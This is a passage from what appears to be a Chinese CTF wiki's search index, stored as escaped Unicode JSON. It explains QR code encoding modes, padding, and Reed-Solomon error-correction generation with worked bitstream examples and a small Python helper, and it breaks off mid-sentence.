\u65e5\u6587\u6a21\u5f0f\u2026\u2026 1\uff5e9 10 9 8 8 10\uff5e26 12 11 16 10 27\uff5e40 14 13 16 12"},{"location":"ctf/misc/qrcode/#eci-742","title":"ECI \u6a21\u5f0f\uff087.4.2\uff09","text":"<p>ECI \u6a21\u5f0f\u5373\u4f7f\u7528\u67d0\u4e9b\u7279\u5b9a\u7684\u5b57\u7b26\u6620\u5c04\u6765\u628a\u5b57\u7b26\u8f6c\u6362\u4e3a\u6bd4\u7279\u6d41</p> <p>\u800c\u4e14\u90fd\u4f7f\u7528\u5b57\u8282\u6a21\u5f0f\u6765\u8868\u793a\u6570\u636e\uff08\u5373\u5728 ECI \u5934\u540e\u7684\u6a21\u5f0f\u6807\u8bc6\u7b26\u4e3a\u5b57\u8282\u6a21\u5f0f\u7684 0100\uff09</p> <p>\u6bcf\u4e2a ECI \u90fd\u6709\u4e00\u4e2a\u516d\u4f4d\u6570\u7f16\u53f7\uff08assignment value\uff09\uff0c\u53ef\u80fd\u5360 1\u30012\u30013 \u4e2a codewords\uff0c\u5177\u4f53\u6807\u8bc6\u65b9\u5f0f\u89c1\u4e0b\u8868\uff08\u53601\u4e2a codewords \u65f6\u5f00\u5934\u4e00\u5b9a\u662f0\uff0c\u53602\u4e2a\u65f6\u5f00\u5934\u4e00\u5b9a\u662f10\uff0c\u53603\u4e2a\u65f6\u5f00\u5934\u4e00\u5b9a\u662f110\uff09\u8868\u4e2d xxxxxxxx \u8868\u793a\u7f16\u53f7\u7684\u4e8c\u8fdb\u5236</p> ECI Assignment Value Codewords values 000000 \uff5e 000127 0xxxxxxx 000000 \uff5e 016383 10xxxxxx xxxxxxxx 000000 \uff5e 999999 110xxxxx xxxxxxxx xxxxxxxx <p>\u800c\u4e14 ECI \u6a21\u5f0f\u4e0b\u4e2d\u9014\u53ef\u4ee5\u66f4\u6362 ECI \u6307\u793a\u5668\uff0c\u4e00\u4e2a 5C\uff0801011100\uff09\u8868\u793a\u6362\u65b0\u7684 ECI\uff0c\u540e\u9762\u8981\u63a56\u4e2a codewords \u53736\u4e2a\u6570\u5b57\uff08\u5341\u516d\u8fdb\u523630\uff5e39\uff09\u8868\u793a\u7f16\u53f7\uff0c\u800c\u4e0d\u662f\u7528\u4e0a\u8868\u4e2d\u7684\u8868\u793a\u65b9\u6cd5\u3002\u800c 5C \u6b63\u5e38\u60c5\u51b5\u4e0b\u8868\u793a  \uff0c\u6240\u4ee5\u8868\u793a  \u8fd9\u4e2a\u539f\u6570\u636e\u9700\u8981\u7528\u4e24\u4e2a 5C</p> \u4f8b\u5b50 1 <p>\u4f7f\u7528 ISO/IEC 8859-7\uff08ECI 000009\uff09\u6765\u8868\u793a\u5e0c\u814a\u5b57\u6bcd\u0391\u0392\u0393\u0394\u0395\uff08\u8be5 ECI \u4e0b\u8868\u793a\u4e3a\u5341\u516d\u8fdb\u5236 A1 A2 A3 A4 A5\uff09</p> <p>\u6bd4\u7279\u6d41\uff1a</p> <ul> <li>ECI \u6807\u8bc6\u7b26\uff1a<code>0111</code></li> <li>ECI \u7f16\u53f7\uff1a<code>00001001</code></li> <li>\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a<code>0100</code></li> <li>\u5b57\u7b26\u6570\u91cf\uff1a<code>00000101</code>\uff085\u4e2a\u5b57\u7b26\uff09</li> <li>\u6570\u636e\uff1a<code>10100001 10100010 10100011 10100100 10100101</code></li> </ul> <p>\u6240\u4ee5\u6700\u7ec8\u7684\u6bd4\u7279\u6d41\uff1a<code>0111 00001001 0100 00000101 10100001 10100010 10100011 10100100 10100101</code></p> \u4f8b\u5b50 2\uff0814.3\uff09 <ul> <li>\u9700\u8981\u7f16\u7801\u7684\u6570\u636e\uff1aABC\\123456<ul> <li>\u6570\u636e\u6d41\u4e2d\u5341\u516d\u8fdb\u5236\uff08\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b260100\u540e\uff09\uff1a41 42 43 5C 5C 31 32 33 34 35 36</li> </ul> </li> <li>\u9700\u8981\u7f16\u7801\u7684\u6570\u636e\uff1aABC&lt;\u540e\u63a5 ECI 123456 \u4e0b\u7684\u6570\u636e\u2026\u2026&gt;<ul> <li>\u6570\u636e\u6d41\u4e2d\u5341\u516d\u8fdb\u5236\uff08\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b260100\u540e\uff09\uff1a41 42 43 5C 31 32 33 34 35 36 \u2026\u2026</li> </ul> </li> </ul>"},{"location":"ctf/misc/qrcode/#743","title":"\u6570\u5b57\u6a21\u5f0f\uff087.4.3\uff09","text":"<p>\u8f93\u5165\u7684\u6570\u5b57\u5b57\u7b26\u4e32\uff08\u56e0\u4e3a\u5f00\u5934\u53ef\u4ee5\u662f0\uff09\u8981\u88ab\u5206\u62103\u4e2a\u4e00\u7ec4\uff0c\u6bcf\u7ec4\u4f1a\u8f6c\u6362\u4e3a 10 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08999 -&gt; <code>1111100111</code>\uff09\u3002\u5269\u4f59\u4e0d\u52303\u4e2a\u7684\u90e8\u5206\uff0c\u5982\u679c\u52692\u4e2a\u6570\u5b57\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a 7 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff0899 -&gt; <code>1100011</code>\uff09\u5982\u679c\u52691\u4e2a\u6570\u5b57\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a 4 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff089 -&gt; <code>1001</code>\uff09</p> <p>\u7136\u540e\u5f00\u5934\u52a0\u4e0a\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26 <code>0001</code> \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u5b57\u7b26\u4e2a\u6570\u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff0c\u5e76\u5f00\u5934\u88650\u81f3\u957f\u5ea6\uff0c\u957f\u5ea6\u7531\u7248\u672c\u51b3\u5b9a\uff0c\u89c1\u4e0a 7.4.1 \u90e8\u5206\u7684\u7b2c\u4e8c\u4e2a\u8868\uff09</p> \u4f8b\u5b50 <ul> <li>\u6570\u636e\u5185\u5bb9\uff1a <code>01234567</code>\uff08\u4fdd\u7559\u5f00\u59340\uff09</li> <li>\u6570\u636e\u6d41\u90e8\u5206\uff1a<ul> <li>\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a <code>0001</code></li> <li>\u6570\u91cf\u6807\u8bc6\u7b26\uff1a <code>0000001000</code>\uff088\uff0c\u4e14\u7248\u672c1\u4e0b\u89c4\u5b9a\u4e3a 10 bits\uff09</li> <li>\u6570\u636e\uff1a<ul> <li>012 -&gt; <code>0000001100</code></li> <li>345 -&gt; <code>0101011001</code></li> <li>67 -&gt; <code>1000011</code></li> </ul> </li> </ul> </li> <li>\u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a <code>0001 0000001000 0000001100 0101011001 1000011</code></li> </ul> <p>\u6570\u5b57\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\u4e3a\uff1a</p> \\[ B=M+C+10\\times\\lfloor\\frac{D}{3}\\rfloor+R \\] <p>\u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff08\u7248\u672c1\uff5e9\u4e3a 10\uff0c\u7248\u672c10\uff5e26\u4e3a 12\uff0c\u7248\u672c27\uff5e40\u4e3a 14\uff09\uff0cD\u4e3a\u8f93\u5165\u5b57\u7b26\u4e2a\u6570\uff0cR\u4e3a\u5269\u4f59\u90e8\u5206\uff08\u82e5 D mod 3 = 0 \u5219\u4e3a 0\uff0c\u82e5 D mod 3 = 1 \u5219\u4e3a 4\uff0c\u82e5 D mod 3 = 2 \u5219\u4e3a 7\uff09</p>"},{"location":"ctf/misc/qrcode/#744","title":"\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\uff087.4.4\uff09","text":"<p>\u6570\u5b57\u5b57\u6bcd\u6a21\u5f0f\uff08Alphanumeric mode\uff09\u4e0b\u652f\u6301\u7684\u7f16\u7801\u5b57\u7b26\u670945\u4e2a\uff0c\u628a\u5b83\u4eec\u4ece0\u7f16\u53f7\u81f344\u3002\u5176\u4e2d 0-9 \u5bf9\u5e94\u6570\u5b57 0-9\uff0c10-35 \u5bf9\u5e94\u5b57\u6bcd A-Z\uff0c36-44 \u5bf9\u5e949\u4e2a\u7b26\u53f7\uff1a</p> <p></p> <p>\u8f93\u5165\u7684\u5b57\u7b26\u5148\u6309\u7167\u4e0a\u8868\u8f6c\u6362\u4e3a\u6570\u503c\uff0c\u7136\u540e\u5206\u4e3a\u4e24\u4e2a\u4e00\u7ec4\uff0c\u6bcf\u4e00\u7ec4\u5185\u628a \u7b2c\u4e00\u4e2a\u6570\u503c \u00d7 45 + \u7b2c\u4e8c\u4e2a\u6570\u503c\uff0c\u518d\u8f6c\u6362\u4e3a\u957f\u5ea6\u4e3a 11 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08\u6700\u5927\u4e3a 44\u00d745+44=2024 -&gt; <code>11111101000</code>\uff09\u3002\u5982\u679c\u5b57\u7b26\u957f\u5ea6\u4e3a\u5947\u6570\uff0c\u5219\u4f1a\u5269\u4f59\u51fa\u4e00\u4e2a\u5b57\u7b26\uff0c\u9700\u8981\u5c06\u5176\u503c\u8f6c\u6362\u4e3a\u957f\u5ea6\u4e3a 6 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08\u6700\u5927\u4e3a 11 -&gt; <code>101100</code>\uff09</p> <p>\u7136\u540e\u5f00\u5934\u52a0\u4e0a\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26 <code>0010</code> \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u7531 7.4.1 \u7b2c\u4e8c\u4e2a\u8868\u89c4\u5b9a\uff09</p> \u4f8b\u5b50 <p>\u6570\u636e\u5185\u5bb9\uff1aAC-42</p> <p>\u6570\u636e\u6d41\u90e8\u5206\uff1a</p> <ul> <li>\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a <code>0010</code></li> <li>\u6570\u91cf\u6807\u8bc6\u7b26\uff1a <code>000000101</code>\uff085\uff0c\u4e14\u7248\u672c1\u4e0b\u89c4\u5b9a\u957f\u5ea6\u4e3a9\uff09</li> <li>\u6570\u636e\uff1aAC-42 -&gt; 10 12 41 4 2 -&gt; (10 12)(41 4)(2)<ul> <li>10 12 -&gt; 10*45+12=462 -&gt; <code>00111001110</code></li> <li>41 4 -&gt; 41*45+4=1849 -&gt; <code>11100111001</code></li> <li>2 -&gt; 2 -&gt; <code>000010</code> </li> </ul> </li> </ul> <p>\u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a <code>0010 000000101 00111001110 11100111001 000010</code></p> <p>\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\u4e3a\uff1a</p> \\[B=M+C+11\\times\\lfloor\\frac{D}{2}\\rfloor+6\\times(D\\bmod 2)\\] <p>\u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff0cD \u4e3a\u539f\u6570\u636e\u957f\u5ea6</p>"},{"location":"ctf/misc/qrcode/#745","title":"\u5b57\u8282\u6a21\u5f0f\uff087.4.5\uff09","text":"<p>\u5b57\u8282\u6a21\u5f0f\uff08Byte mode\uff09\u4e0b\u628a\u6bcf\u4e2a\u5b57\u7b26\u6839\u636e Latin-1\uff08ISO/IEC 8859-1\uff09\u7f16\u7801\u6210 8 bits\uff081\u5b57\u8282\uff09\uff0c\u76f4\u63a5\u63a5\u5728\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b26 <code>0100</code> \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u7531 7.4.1 \u7b2c\u4e8c\u4e2a\u8868\u89c4\u5b9a\uff09\u7684\u540e\u9762\u3002</p> Latin-1 <p></p> <p>\u5b57\u8282\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\uff1a</p> \\[B=M+C+8\\times D\\] <p>\u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff0cD \u4e3a\u539f\u6570\u636e\u957f\u5ea6</p>"},{"location":"ctf/misc/qrcode/#_1","title":"\u4e2d\u6587\u7f16\u7801","text":"<p>\u4e2d\u6587\u5728\u8f6c\u6362\u6210\u6bd4\u7279\u6d41\u7684\u65f6\u5019\u4e5f\u4f7f\u7528\u5b57\u8282\u6a21\u5f0f\uff0c\u9700\u8981\u7528 UTF-8 \u7f16\u7801\uff0c\u6bcf\u4e2a\u5b57\u7b26\u4f1a\u88ab\u7f16\u7801\u6210 3 \u4e2a\u5b57\u8282</p>"},{"location":"ctf/misc/qrcode/#747","title":"\u6df7\u5408\u6a21\u5f0f\uff087.4.7\uff09","text":"<p>\u4e00\u4e2a\u4e8c\u7ef4\u7801\u7684\u6570\u636e\u6d41\u4e2d\u4e5f\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u6a21\u5f0f\uff0c\u4e14\u4e0d\u9700\u8981\u7279\u522b\u8868\u793a\u3002\u66f4\u6362\u65b0\u7684\u6a21\u5f0f\u65f6\u53ea\u9700\u8981\u6b63\u5e38\u6dfb\u52a0 \u6a21\u5f0f\u6807\u8bc6\u7b26+\u6570\u91cf\u6807\u8bc6\u7b26+\u6570\u636e \u5373\u53ef</p> <p></p> \u4f8b\u5b50 <p>\u539f\u59cb\u6570\u636e\uff1a123\u6d4b\u8bd5</p> <p>\u6570\u636e\u6d41\uff1a</p> <ul> <li>\u6570\u5b57\u6a21\u5f0f\uff1a<ul> <li>\u6807\u8bc6\u7b26\uff1a <code>0001</code></li> <li>\u6570\u91cf\u6807\u8bc6\u7b26\uff1a <code>0000000011</code>\uff083\uff0c\u957f\u5ea610\uff09</li> <li>\u6570\u636e\uff1a123 -&gt; <code>0001111011</code></li> </ul> </li> <li>\u5b57\u8282\u6a21\u5f0f\uff1a\u6d4b\u8bd5 -&gt; E6 B5 8B / E8 AF 95<ul> <li>\u6807\u8bc6\u7b26\uff1a <code>0100</code></li> <li>\u6570\u91cf\u6807\u8bc6\u7b26\uff1a <code>00000110</code>\uff086\uff0c\u957f\u5ea68\uff09</li> <li>\u6570\u636e\uff1a<ul> <li>\u6d4b -&gt; <code>11100110 10110101 10001011</code></li> <li>\u8bd5 -&gt; <code>11101000 10101111 10010101</code></li> </ul> </li> </ul> </li> </ul> <p>\u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a <code>0001 0000000011 0001111011 0100 00000110 11100110 10110101 10001011 11101000 10101111 10010101</code></p>"},{"location":"ctf/misc/qrcode/#749","title":"\u7ed3\u675f\u7b26\uff087.4.9\uff09","text":"<p>\u5728\u6570\u636e\u7684\u672b\u5c3e\u8981\u586b\u51454\u4e2a0\u4f5c\u4e3a\u7ed3\u675f\u7b26\uff0c\u5982\u679c\u5bb9\u91cf\u4e0d\u8db3\u7684\u8bdd\u53ef\u4ee5\u7f29\u77ed\u6216\u7701\u7565 \u5373\u80fd\u586b\u4e0b\u5219\u52a04\u4e2a0\uff0c\u586b\u4e0d\u4e0b\u5219\u80fd\u52a0\u51e0\u4e2a0\u5c31\u52a0\u51e0\u4e2a0</p>"},{"location":"ctf/misc/qrcode/#padding-bits7410","title":"\u586b\u5145 padding bits\uff087.4.10\uff09","text":"<p>\u8f6c\u6362\u540e\u7684\u6570\u636e\u6bd4\u7279\u6d41\u8fd8\u9700\u8981\u586b\u5145\u81f3\u4e8c\u7ef4\u7801\u7684\u6570\u636e\u5bb9\u91cf</p> <ol> <li>\u9996\u5148\u5148\u7528 <code>0</code> \u8865\u5145\u6bd4\u7279\u6d41\u957f\u5ea6\u5230 8 \u7684\u6574\u6570\u500d</li> <li>\u7136\u540e\u7528 <code>11101100</code> \u548c <code>00010001</code> \u4ea4\u66ff\u586b\u8865\u5230\u4e8c\u7ef4\u7801\u6570\u636e\u5bb9\u91cf</li> </ol> <p>\u5177\u4f53\u7684\u6570\u636e\u5bb9\u91cf\u7531\u7248\u672c\u53f7\u548c\u7ea0\u9519\u7b49\u7ea7\u51b3\u5b9a\uff0c\u4e14\u6570\u636e\u5bb9\u91cf\uff08\u6bd4\u7279\uff09\u4e00\u5b9a\u4e3a8\u7684\u500d\u6570\uff0c\u5b8c\u6574\u6570\u636e\u89c1\u6587\u6863\u7684 33\uff5e36 \u9875\uff08\u6574\u4e2a pdf \u7684\u7b2c 41\uff5e44 \u9875\uff09</p> <p>\u6ce8</p> <p>\u8fd9\u4e2a\u5730\u65b9 QRazyBox \u7f51\u7ad9\u5b58\u5728 bug\uff0c\u6709\u65f6\u65e0\u6cd5\u6b63\u5e38\u8bc6\u522b\u586b\u5145\u7684 0 \u6bd4\u7279\u548c padding bits\uff08\u5373\u53ef\u80fd\u628a\u586b\u5145\u7684 0 \u4e2d\u524d\u56db\u4e2a\u89c6\u4e3a\u4e00\u4e2a terminator\uff0c\u628a\u540e\u9762\u7684 0 \u624d\u89c6\u4e3a\u5c5e\u4e8e padding bits \uff09</p>"},{"location":"ctf/misc/qrcode/#75","title":"\u7ea0\u9519\u7801\u7f16\u7801\uff087.5\uff09","text":""},{"location":"ctf/misc/qrcode/#751","title":"\u7ea0\u9519\u5bb9\u91cf\uff087.5.1\uff09","text":"<p>\u7ea0\u9519\u5b57\uff08error correction codewords\uff09\u53ef\u4ee5\u7ea0\u6b63\u4e24\u79cd\u9519\u8bef\uff0c\u4e00\u79cd\u662f\u6bd4\u5982\u65e0\u6cd5\u626b\u63cf\u6216\u65e0\u6cd5\u89e3\u7801\u7684\u5df2\u77e5\u4f4d\u7f6e\u7684\u9519\u8bef\u5b57\uff08erasures\uff09\uff0c\u4e00\u79cd\u662f\u672a\u77e5\u4f4d\u7f6e\u7684\u9519\u8bef\u5b57\uff08errors\uff09\uff0c\u4e00\u4e2a erasures \u53ef\u4ee5\u7531\u4e00\u4e2a\u7ea0\u9519\u5b57\u7ea0\u9519\uff0c\u800c\u4e00\u4e2a errors \u9700\u8981\u4e24\u4e2a\u7ea0\u9519\u5b57\u6765\u7ea0\u9519</p> <p>\u53ef\u4ee5\u7ea0\u9519\u7684 erasures \u548c errors \u7684\u6570\u91cf\u6ee1\u8db3\uff1a</p> \\[e+2t\\leq d-p\\] <p>\u5176\u4e2d \\(e\\) \u662f erasures \u7684\u6570\u91cf\uff0c\\(t\\) \u662f errors \u7684\u6570\u91cf\uff0c\\(d\\) \u662f\u7ea0\u9519\u5b57\u7684\u6570\u91cf\uff0c\\(p\\) \u662f\u88ab\u9519\u8bef\u89e3\u6790\u7684\u4fdd\u62a4\u5b57\u6570\u91cf</p> <p>\u5176\u4e2d \\(p\\) \u7531\u7248\u672c\u51b3\u5b9a\uff1a</p> <ul> <li>\\(p=3\\)\uff1a\u7248\u672c 1-L</li> <li>\\(p=2\\)\uff1a\u7248\u672c 1-M\u30012-L</li> <li>\\(p=1\\)\uff1a\u7248\u672c 1-Q\u30011-H\u30013-L</li> <li>\\(p=0\\)\uff1a\u5176\u4ed6\u6240\u6709\u7248\u672c</li> </ul>"},{"location":"ctf/misc/qrcode/#_2","title":"\u5206\u5757\u7f16\u7801\u7ea0\u9519\u7801","text":"<p>\u6839\u636e\u7248\u672c\u53f7\u53ca\u7ea0\u9519\u7b49\u7ea7\uff0c\u6570\u636e\u5e8f\u5217\u9700\u8981\u88ab\u5206\u6210 1 \u4e2a\u6216\u591a\u4e2a\u5757\uff0c\u6bcf\u5757\u5185\u9700\u8981\u5355\u72ec\u7f16\u7801\u7ea0\u9519\u7801</p> <p>\u5982\u679c\u9700\u8981\u8865\u5145\u7684\u8bdd\u4e00\u5f8b\u5168\u90e8\u8865\u5145 0 \u6bd4\u7279\u5230\u9700\u8981\u7684\u957f\u5ea6</p> <p>\u5177\u4f53\u4e0d\u540c\u7248\u672c\u7684\u5206\u5757\u5757\u6570\u548c\u6bcf\u5757\u4e2d\u6570\u91cf\u5b89\u6392\u4ee5\u53ca\u7ea0\u9519\u5bb9\u91cf\u90fd\u5728\u6587\u6863\u4e2d P38-44\uff08pdf \u4e2d P46-52\uff09\u7684\u5927\u8868\u683c Table 9 \u4e2d</p>"},{"location":"ctf/misc/qrcode/#752","title":"\u751f\u6210\u7ea0\u9519\u7801\uff087.5.2\uff09","text":""},{"location":"ctf/misc/qrcode/#_3","title":"\u4f3d\u7f57\u74e6\u57df","text":"<p>\u751f\u6210\u7ea0\u9519\u7801\u4e4b\u524d\u8981\u5148\u5c06\u6240\u6709\u6570\u636e\u5b57\u8f6c\u6362\u6210\u4e00\u4e2a\u591a\u9879\u5f0f\uff0c\u4f7f\u5176\u9650\u5236\u4e8e\u4f3d\u7f57\u74e6\u57df \\(GF(2^3)\\bmod 100011101\\) \u4e2d\uff0c\u800c\u4e14\u540e\u7eed\u7684\u56db\u5219\u8fd0\u7b97\u4e5f\u90fd\u662f\u8be5\u4f3d\u7f57\u74e6\u57df\u4e2d\u7684\u8fd0\u7b97</p> <p>\u5177\u4f53\u4f3d\u7f57\u74e6\u57df\u7684\u751f\u6210\u539f\u7406\u53ef\u4ee5\u770b\uff1ahttps://www.codenong.com/cs105738710/</p> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u591a\u9879\u5f0f\u7684\u52a0\u51cf\u6cd5\u90fd\u662f\u5f02\u6216\uff0c\u4e58\u9664\u6cd5\u8981\u6bcf\u4e00\u4e2a\u6bd4\u7279\u6a21 2\uff0c\u6bcf\u4e00\u4e2a\u5b57\u8282\u6a21 100011101\uff08\u5373\u8be5\u4f3d\u7f57\u74e6\u57df\u4e2d\u7684\u672c\u539f\u591a\u9879\u5f0f \\(x^8+x^4+x^3+x^2+1\\)\uff09</p> <p>\u5177\u4f53\u591a\u9879\u5f0f mod \u8fd0\u7b97\u7684\u65b9\u6cd5\u53ef\u4ee5\u770b\uff1ahttps://blog.csdn.net/yaongtime/article/details/17200401</p> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u591a\u9879\u5f0f\u7684\u957f\u9664\u6cd5\u53d6\u6a21\uff0c\u800c\u4e14\u6ce8\u610f\u8fd9\u91cc\u7684\u52a0\u51cf\u90fd\u662f\u4f3d\u7f57\u74e6\u57df\u4e2d\u7684\u52a0\u51cf\uff0c\u5373\u5f02\u6216</p>"},{"location":"ctf/misc/qrcode/#annex-a","title":"\u751f\u6210\u591a\u9879\u5f0f\uff08Annex A\uff09","text":"<p>\u7ea0\u9519\u7801\u751f\u6210\u591a\u9879\u5f0f\u7684\u4e00\u822c\u8868\u8fbe\u5f62\u5f0f\u662f\uff1a</p> \\[g(x)=(x-\\alpha^0)(x-\\alpha^1)\\cdots(x-\\alpha^{n-1})\\] <p>\u5176\u4e2d \\(n\\) \u4e3a\u7ea0\u9519\u7801\u5b57\u7684\u4e2a\u6570\uff0c\u5176\u4e2d \\(\\alpha=2\\)\uff0c \\(\\alpha^k\\) \u7684\u662f\u5728\u4f3d\u7f57\u74e6\u57df\u4e0b\u7684\u8fd0\u7b97\uff0c\u5373\uff1a</p> <p>\\(\\alpha^0 = 1;\\ \\alpha^1=2;\\ \\alpha^2=4;\\ \\cdots;\\ \\alpha^7=128\\)</p> <p>\\(\\alpha^8=256\\bmod 285=256\\oplus 285=29;\\ \\alpha^9=29\\times2=58;\\ \\cdots\\)</p> <p>\u5177\u4f53\u8ba1\u7b97 \\(\\alpha^k\\) \u7684\u4ee3\u7801\uff1a <pre><code>def alpha(k):\n    res = 1\n    for _ in range(k):\n        res *= 2\n        if res &gt;= 256:\n            res ^= 285\n    return res\n</code></pre></p> <p>\u6587\u6863\u9644\u5f55 A \u4e2d\u5df2\u7ecf\u5c55\u5f00\u4e86\u6240\u6709\u53ef\u80fd \\(n\\) \u503c\u4e0b\u768436\u4e2a\u751f\u6210\u591a\u9879\u5f0f</p>"},{"location":"ctf/misc/qrcode/#_4","title":"\u751f\u6210\u7ea0\u9519\u7801","text":"<p>\u6587\u6863\u91cc\u7ed9\u4e86\u4e00\u4e2a\u611f\u89c9\u6bd4\u8f83\u6666\u6da9\u96be\u61c2\u7684\u56fe\u6765\u5c55\u793a\u751f\u6210\u7ea0\u9519\u7801\u7684\u8fc7\u7a0b\uff1a</p> <p></p> <p>\u4e0d\u662f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u4e8e\u662f\u627e\u4e86\u53e6\u4e00\u7bc7\u6587\u7ae0\uff1ahttps://blog.csdn.net/ljm1995/article/details/88819664</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6bd4\u5982\u8981\u7f16\u7801 12345678 \u8fd9\u516b\u4e2a\u6570\u5b57</p> <p>\u7248\u672c 1-L\uff0c\u67e5 Table 9 \u5f97\u5230\u5206\u4e3a 1 \u5757\uff0c\u4e14\u8be5\u5757\u5185\u603b\u5b57\u6570\u4e3a 26\uff0c\u6570\u636e\u5b57\u6570\u4e3a 19\uff0c\u7ea0\u9519\u5b57\u6570\u4e3a 26-19=7</p> <p>\u6839\u636e\u524d\u9762\u6240\u8bf4\uff0c\u6bd4\u7279\u6d41\u5e94\u8be5\u662f\uff1a <code>0001 0000001000 0001111011 0111001000 1001110 0000</code></p> <p>\u8865\u6210 8 \u7684\u500d\u6570\u957f\u5ea6\uff1a <code>00010000 00100000 01111011 01110010 00100111 00000000</code></p> <p>\u6dfb\u52a0 padding bits\uff08\u8865\u5230 19 \u4e2a\u5b57\u8282\uff09\uff1a <code>00010000 00100000 01111011 01110010 00100111 00000000 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100</code></p> <p>\u5199\u6210\u591a\u9879\u5f0f\u5f62\u5f0f\uff0c\u6b21\u6570\u662f 19 \u6b21\uff0c\u6574\u4f53\u4e58 \\(x^7\\)\uff1a</p> \\[16x^{25}+32x^{24}+123x^{23}+114x^{22}+39x^{21}+236x^{19}+\\\\\\\\17x^{18}+236x^{17}+17x^{16}+236x^{15}+17x^{14}+236x^{13}+\\\\\\\\17x^{12}+236x^{11}+17x^{10}+236x^{9}+17x^{8}+236x^{7}\\] <p>\u518d\u67e5\u9644\u5f55 A \u5f97\u5230\u6b21\u6570\u4e3a 7 \u7684\u751f\u6210\u591a\u9879\u5f0f\uff0c\u5e76\u6574\u4f53\u4e58 \\(x^{18}\\)\uff1a</p> \\[x^{25}+\\alpha^{87}x^{24}+\\alpha^{229}x^{23}+\\alpha^{146}x^{22}+\\alpha^{149}x^{21}+\\\\\\\\\\alpha^{238}x^{20}+\\alpha^{102}x^{19}+\\alpha^{21}x^{18}\\] <p>\u7136\u540e\u628a\u7b2c\u4e00\u4e2a\u591a\u9879\u5f0f\u9664\u7b2c\u4e8c\u4e2a\u591a\u9879\u5f0f\u53d6\u4f59\u6570</p> <p>\u53ef\u4ee5\u8fd9\u6837\u8ba1\u7b97\uff0c\u628a\u7b2c\u4e8c\u4e2a\u591a\u9879\u5f0f\u6574\u4f53\u4e58 16 \u5373 \\(\\alpha^4\\)\uff1a</p> \\[\\alpha^4x^{25}+\\alpha^{91}x^{24}+\\alpha^{233}x^{23}+\\alpha^{150}x^{22}+\\alpha^{153}x^{21}+\\\\\\\\\\alpha^{242}x^{20}+\\alpha^{106}x^{19}+\\alpha^{25}x^{18}\\] <p>\u8ba1\u7b97\u51fa\u7cfb\u6570\u7684\u503c\uff1a</p> \\[16x^{25}+163x^{24}+243x^{23}+85x^{22}+146x^{21}+\\\\\\\\176x^{20}+52x^{19}+3x^{18}\\] <p>\u4e4b\u540e\u4e0e\u7b2c\u4e00\u4e2a\u591a\u9879\u5f0f\u5f02\u6216\u5f97\u5230\uff1a</p> \\[131x^{24}+136x^{23}+197x^{22}+181x^{21}+216x^{19}+18x^{18}+\\\\\\\\236x^{17}+17x^{16}+236x^{15}+17x^{14}+236x^{13}+\\\\\\\\17x^{12}+236x^{11}+17x^{10}+236x^{9}+17x^{8}+236x^{7}\\] <p>\u8fd9\u4e4b\u540e\u6700\u9ad8\u6b21\u5c31\u53d8\u6210\u4e86 24 \u6b21\uff0c\u91cd\u590d\u6574\u4e2a\u8fc7\u7a0b\u76f4\u5230\u7ed3\u679c\u53ea\u5269\u4e0b 7 \u9879\uff08\u5373\u6700\u9ad8\u6b21\u4e3a 6 \u6b21\uff09\u65f6\u5373\u53ef\u5f97\u5230\uff1a</p> \\[188x^6+247x^5+62x^4+248x^3+53x^2+170x+224\\] <p>\u6240\u4ee5\u7ea0\u9519\u7801\u5c31\u662f\uff1a<code>188 247 62 248 53 170 224</code></p> <p>\u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff1a <code>10111100 11110111 00111110 11111000 00110101 10101010 11100000</code></p> <p>\u6240\u4ee5\u6574\u4e2a\u4e8c\u7ef4\u7801\u7684\u7f16\u7801\u533a\u57df\uff08\u9664\u683c\u5f0f\u4fe1\u606f\u5916\uff09\u5168\u90e8\u5185\u5bb9\u5c31\u662f\uff1a <code>00010000 00100000 01111011 01110010 00100111 00000000 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 10111100 11110111 00111110 11111000 00110101 10101010 11100000</code></p> <p>\u7ea0\u9519\u7801\u53ef\u4ee5\u76f4\u63a5\u7528 python \u7684 reedsolo 